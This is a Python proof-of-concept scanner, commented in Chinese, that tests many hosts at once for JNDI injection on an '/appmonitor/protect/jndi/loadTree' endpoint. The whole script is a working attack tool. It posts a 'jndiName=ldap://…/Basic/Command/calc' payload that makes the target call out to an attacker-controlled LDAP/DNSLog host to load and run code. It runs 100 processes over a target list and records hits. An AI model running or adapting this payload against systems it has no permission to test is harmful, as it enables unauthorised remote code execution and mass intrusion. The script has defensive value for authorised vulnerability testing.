import requests
import argparse
from multiprocessing import Pool    # 导入的是子进程，为了多进程同时开启检测，提高效率，多个网站测试
from urllib.parse import quote      # quote()为了url编码，防止特殊字符影响请求

# 字符画标识（延续你的极客风格）
banner = r"""
      **       ****     **             *******                     **
     /**      /**/**   /**            /**////**                   /**
     /**      /**//**  /**            /**    /**                  /**
     /**      /** //** /**            /**    /**                  /**
     /**      /**  //**/**            /**    /**                  /**
 **  /**      /**   //****            /**    **                   /**
//*****       /**    //***            /*******                    /**
 /////        //      ///             ///////                     // 
                                               Owner:JY-666-YINZI
                                               Version:1.0.0
"""

# 解除 urllib3 未验证 HTTPS 请求的警告，防止屏幕输出过多红字影响体验
requests.packages.urllib3.disable_warnings()

# 1. 编写poc函数，传入url参数，检测url是否存在漏洞
def poc(url, dnslog_domain=None):                       # 用poc函数来输入url检测这个url的漏洞是否存在 
    url = url.strip()   # 去除url前后空格            
    # 加下来要将url自动补全加上协议,但是如果已经文档里文件中给了就不用，所以if判断一下
    if not url.startswith(('http://', 'https://')):
        url = "http://" + url      # 可拆换
    
    # 提取 Host 头部字段（过滤掉协议头）
    hosts = url.replace("https://", "").replace("http://", "") 
    print(hosts)
    
    # 如果用户没有输入自定义的 dnslog_domain，就使用一个占位符提示
    dns_target = dnslog_domain if dnslog_domain else "your-dnslog.com"
    
    # 构造远程执行 JNDI 加载的 payload，这里使用指定的 ldap 地址
    payload = f"jndiName=ldap://{hosts}.{dns_target}/Basic/Command/calc"
    
    headers = {
        "Host": hosts,    # 设置变量，防止协议影响检测
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(payload)) # 动态计算长度，防止硬编码导致服务器不识别
    }
    
    proxies = {'http': 'http://127.0.0.1:7890', 'https': 'http://127.0.0.1:7890'}   # 设置代理，方便联动本地抓包调试
    url = url.replace(" ", "")   # 去除url前后空格
    
    # 1.1. 这里是构造请求路径，拼接上可能存在JNDI注入的loadTree接口
    target = url + "/appmonitor/protect/jndi/loadTree"   
    print(target)    # 输出一行显示target，检测当前攻击路径拼接是否正确
    
    # 接下来写返回值判断是否能访问到
    try:
        # 1.2. 这里是构造的请求包结构和payload等，利用verify忽略自签证书
        response = requests.post(target, headers=headers, data=payload, timeout=5, proxies=proxies, verify=False)
        
        # 1.3. 这里是返回值判断是否发包成功。因为JNDI注入是无回显漏洞，主要看服务器有没有向我们的DNSLog发请求。
        # 只要服务器成功响应了200，说明接口走通了，极有可能会去请求我们的LDAP服务，判定为大概率存在。
        if response.status_code == 200:   
            print(f"[+] [{response.status_code}] 已成功发送Payload，请前往你的 DNSLog 控制台查看是否有解析记录 -> {url}")                  
            
            # 将url写入文件中，方便后续手工验证
            with open("3result.txt", 'a+', encoding='utf-8') as f: # 使用a是因为要追加写，w是覆盖写
                f.seek(0)                       # 将文件指针移动到文件开头，防止追加写时写在文件末尾
                content = f.read()                # 读取文件内容
                if content == "" or url not in content:   # 判断文件内容是否为空或者文件内容中是否包含url，防止重复写入
                    f.write(url + f" 疑似存在JNDI注入漏洞 (DNSLog标识: {hosts}.{dns_target})\n")   
        else:
            print(f"[-] [{response.status_code}] 接口响应异常 -> {url}")                
    except Exception as e:
        print(f"[!] 访问异常 ({url})：{e}")                    # 当连访问都报错抛出异常时，抓取报错

# 2. 已经写完poc函数，接下来写主函数↓
# 写主函数，调用poc函数，传入url参数
def main():
    parser = argparse.ArgumentParser(description="JNDI注入漏洞检测脚本")
    parser.add_argument("-u", "--url", help="目标单个url")  # 添加url参数,可选输入
    parser.add_argument("-f", "--file", help="目标url批量文件")   # 添加url文件参数,可选输入
    parser.add_argument("-d", "--dnslog", help="你的DNSLog域名 (例如: abc.dnslog.cn)", required=False) # 新增dnslog参数
    args = parser.parse_args()    # 解析参数
    
    dnslog = args.dnslog if args.dnslog else "your-dnslog.com"
    
    if args.url:                # 如果输入了url参数，就调用poc函数，传入url参数
        poc(args.url, dnslog)
    elif args.file:             # 如果输入了url文件参数，就调用poc函数，传入url文件参数
        with open(args.file, 'r', encoding='utf-8') as ff:
            li = []               # 创建一个空列表li：这里是为了防止url文件里有空格，所以要去除空格
            for line in ff:      # 逐行读取url文件，不用f.readlines()
                cleaned_line = line.strip().replace("\n", "")
                if cleaned_line:  # 过滤空行
                    li.append(cleaned_line)
            
            # 开启进程池批量扫描
            # 因为带有 dnslog 参数，我们用 pool.starmap 或者通过 lambda 构建参数传递
            mp = Pool(100)        
            # 将参数打包传递给 poc
            mp.starmap(poc, [(url, dnslog) for url in li])      
            mp.close()          # 关闭子进程池          
            mp.join()           # 等待子进程池中的所有进程执行完毕，再继续执行主函数
    else:
        print("[-] 错误：请提供目标 '-u url' 或 '-f file'")

# 3. 为了在命令行中运行脚本时，脚本会自动执行main()函数，所以需要在if __name__=="__main__":下执行main()函数
if __name__ == "__main__": # 主函数入口
    print(banner)   # 输出字符画标识
    main()          # 调用主函数
